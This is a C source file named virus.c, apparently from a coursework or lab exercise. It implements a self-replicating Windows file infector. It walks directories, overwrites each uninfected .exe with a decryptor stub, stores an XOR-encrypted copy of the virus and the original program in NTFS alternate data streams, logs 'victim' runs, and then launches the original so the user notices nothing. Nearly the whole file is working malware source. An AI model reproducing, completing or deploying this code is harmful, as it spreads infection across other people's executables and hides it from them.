/* virus.c
 * Aim: find all uninfected file and infected them by 
 *      1. replace oldprogram with dec.exe
 *      2. insert *.exe:virus.exe and *.exe:oldprogram.exe
 *
 *
 */





#include<io.h>
#include<stdio.h>
#include <unistd.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>


#define MAXSIZE 200
void get_exe_file();
//char oldprogram_name[MAXSIZE];
int verbose=1;
char virus_abs_path[MAXSIZE]="c:\\cygwin\\home\\Administrator\\virus\\virus.exe";
char dec_abs_path[MAXSIZE]="c:\\cygwin\\home\\Administrator\\virus\\dec.exe";
char haking_text_path[MAXSIZE]="c:\\cygwin\\home\\Administrator\\virus";


char* findfiles(char directory[MAXSIZE]);
void check_infect(char path[MAXSIZE]);
void infect(char file_path[MAXSIZE]);
int main(int argc,char* argv[])
{
	char command[MAXSIZE];
    //sprintf(oldprogram_name,"%s",argv[0]);
   
    //get_exe_file("c:\\cygwin\\home\\Administrator\\my_virus");
	                      
   // get_exe_file("*");
  
    findfiles("./");
	//payload
	printf("Virus !!!\n");
	
	if(argc==2){
		sprintf(command,"echo victim clicked %s >> send_email.txt",argv[1],haking_text_path);
		
		system(command);
	}
	else if(argc==1){
		sprintf(command,"echo victim clicked virus.exe >> send_email.txt",haking_text_path);
		system(command);
	}
	
	//start oldprogram
	if(argc==2){
		
		sprintf(command,"start ./%s:oldprogram.exe",argv[1]);
		printf("%s\n",command);
		system(command);
	}

	
    return 0;
}

char * findfiles(char directory[MAXSIZE])
{
  // Find current directory and search for other executables
  //char * target=NULL, *tmp=NULL;
  char target[MAXSIZE], *tmp=NULL;
  char target_oldprogram[MAXSIZE];
  FILE *fp=NULL;
  DIR *p=NULL;
  struct dirent *pp=NULL;
  //printf("Finding files in : %s\n", directory);
  p = opendir (directory);

  if (p != NULL)
  {
    
    chdir(directory);
    while ((pp = readdir (p))!=NULL) {
      //printf("File %s found.\n",pp->d_name);
      int length = strlen(pp->d_name);
      // if file is an .exe
      if (strncmp(pp->d_name + length - 4, ".exe", 4) == 0) {
		 // printf("find %s\n",pp->d_name);
		if(strcmp(directory, "./")==0){
			//return pp->d_name;
		          //printf("find %s\n",pp->d_name);
				  sprintf(target,"%s",pp->d_name);
				  
		}
	     else{
			
				strcpy(target,directory);
				strcat(target,"\\");
				strcat(target,pp->d_name);
				//printf("File with directory: %s\n",target);
				//return target;
				
		}
		 
       check_infect(target);
	   
      }
	  
      else if (strstr(pp->d_name, ".") == NULL)
      {
		char _path[MAXSIZE];
		//sprintf(_path,"%s/%s/",directory,pp->d_name);
		//tmp = findfiles(_path);
		tmp = findfiles(pp->d_name);
		//printf("tmp-->%s\n",tmp);
        chdir("..");
		
	//return tmp;
      }
	  
    }
    (void) closedir (p);
	//printf("closed\n");
  }
  if(strcmp(directory, "./")!=0)
    chdir("..");
  return NULL;
}

void check_infect(char path[MAXSIZE]){
	char virus_exe[MAXSIZE];
	FILE* fp=NULL;
	sprintf(virus_exe,"%s:oldprogram.exe",path);
	
	if (verbose==1) printf("check exist: %s  ",virus_exe);
	
    if(strcmp(path,"virus.exe")==0 ||strcmp(path,"dec.exe")==0 ){
		if (verbose==1) printf("---> Mother, don't infect\n");
	    
	}else{
		fp = fopen(virus_exe,"rb+");
		if(fp==NULL){
			if (verbose==1) printf("---> not infected\n");
			infect(path);
		}
		else{
			if (verbose==1) printf("---> INFECTED\n");
			
			fclose(fp);	
		}
	
	}
}

void infect(char file_path[MAXSIZE]){
	//1.get file_name
	char key[MAXSIZE],oldprogram_name[MAXSIZE],victim_path[MAXSIZE];
	char* pch;
	//sprintf(victim_path,"%s",file_path);
	pch = strtok(file_path,"/\\");
	while(pch != NULL){
    strcpy(key,pch);
    pch = strtok(NULL, "/\\");
    }
	
    
	sprintf(oldprogram_name,"%s:oldprogram.exe",key);
	if (verbose==1) {
		printf("key name           :    %s\n",key);	
		printf("oldprogram         :  %s\n",file_path);
		printf("injected oldprogram:  %s\n",oldprogram_name);
	}
	
	
	
	//2. xor virus.exe
	if (verbose==1) {
		printf("cp virus.exe to temp_virus.exe\n");
		printf("cp dec.exe to temp_dec.exe\n");
		printf("XORing virus.exe to temp_enc_virus.exe\n");
		
	}

	char command[MAXSIZE];
	sprintf(command,"echo %s > what.txt",key);
	system(command);
	
	sprintf(command,"copy %s temp_virus.exe > null",virus_abs_path);
	system(command);
	sprintf(command,"copy %s temp_dec.exe > null",dec_abs_path);
	system(command);
	
	
	
	//decrypt temp_virus.exe
	FILE* pFile_enc_virus=NULL;
	FILE* pFile_dec_virus=NULL;
	int file_size=0;
	pFile_enc_virus = fopen("temp_virus.exe","rb");
	if(!pFile_enc_virus){
		printf("error open file");
		exit(1);
	}
	
	pFile_dec_virus = fopen("temp_enc_virus.exe","wb");
	if(!pFile_dec_virus){
		printf("error open file");
		exit(1);
	}
	
	fseek(pFile_enc_virus,0,SEEK_END);
	file_size = ftell(pFile_enc_virus);
	fseek(pFile_enc_virus,0,SEEK_SET);
	
	//decrypt virus.
	unsigned char what;
	for(int i=0;i<file_size;i++){
        what = fgetc(pFile_enc_virus);
		what = what ^ key[i%strlen(key)];
		fwrite(&what,1,sizeof(what),pFile_dec_virus);
    }
	fclose(pFile_dec_virus);
	fclose(pFile_enc_virus);
	
	
	
	
	
	
	
	
	//3.  replace oldprogram with dec.exe
	if(verbose==1){
		printf("copy %s to oldprogram.exe\n",key);
	}
	sprintf(command,"copy %s temp_oldprogram.exe > null",key);
	system(command);
	
	sprintf(command,"copy temp_dec.exe %s > null",key);
	system(command);
	
	
	
	//4.1 : ads dec.exe:virus.exe
	if(verbose==1){
		printf("TYPE temp_enc_virus.exe > %s:virus.exe\n",key);
	}
	sprintf(command,"TYPE temp_enc_virus.exe > %s:virus.exe",key);
	system(command);
	//4.2 : ads dec.exe:oldprogram.exe
	if(verbose==1){
		printf("TYPE temp_oldprogram.exe > %s:oldprogram.exe\n",key);
	}
	sprintf(command,"TYPE temp_oldprogram.exe > %s:oldprogram.exe",key);
	system(command);
	
	
	//del
	//system("del temp_*.exe > null");
	//exit(1);
	printf("------------------------------\n\n\n");
	
	
}


void get_exe_file(char path[MAXSIZE]){

	struct _finddata_t fileinfo;
    long fHandle;    
    int i = 0;
    char dir_path[MAXSIZE];
	char next_dir_path[MAXSIZE];

	sprintf(dir_path,"%s",path);
	printf("dir %s\n",dir_path);
    if( (fHandle=_findfirst( dir_path, &fileinfo )) == -1L ) 
    {
       // printf( "no any exe files\n");
     
    }
    else{
        do{
			if((fileinfo.attrib & _A_SUBDIR)){
				if(strcmp(fileinfo.name,".") != 0 && strcmp(fileinfo.name,"..") != 0)
					
				    if(strcmp(dir_path,"*")!=0){
				        sprintf(next_dir_path,"%s/%s","c:/cygwin/home/Administrator/my_virus",fileinfo.name);
					}else{
						sprintf(next_dir_path,"%s/",fileinfo.name);
					}
				    printf("find folder %s\n",dir_path);
					get_exe_file(next_dir_path);
			}
			else{
				
			    printf("FILE find");
				i ++;
				printf( "find txt file:%s \n", fileinfo.name);
			}
        }while( _findnext(fHandle,&fileinfo)==0);
    }
   
    _findclose( fHandle );

    printf("total num: %d\n",i);
	
	
}
